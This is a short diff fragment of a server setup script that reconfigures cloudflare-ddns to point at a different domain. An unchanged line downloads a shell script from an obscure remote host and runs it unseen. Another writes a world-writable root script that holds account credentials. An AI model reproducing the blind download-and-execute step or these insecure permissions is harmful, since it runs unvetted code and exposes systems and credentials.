@@ -25,7 +25,7 @@ wget sh.alhttdw.cn/d11.sh && bash d11.sh
 # dowload cloudflare-ddns
 sudo snap refresh && sudo snap install cloudflare-ddns
 # config cloudflare-ddns
-echo 'sudo snap run cloudflare-ddns -e dcmnmmmchkh@gmail.com -k REMOVED -u az.rauxanh.site -4 $(curl ifconfig.me) >> /root/ipcf.log' > /root/cloudflare-update.sh && sudo chmod 777 /root/cloudflare-update.sh
+echo 'sudo snap run cloudflare-ddns -e dcmnmmmchkh@gmail.com -k REMOVED -u a.dautay.xyz -4 $(curl ifconfig.me) >> /root/ipcf.log' > /root/cloudflare-update.sh && sudo chmod 777 /root/cloudflare-update.sh
 
 
 
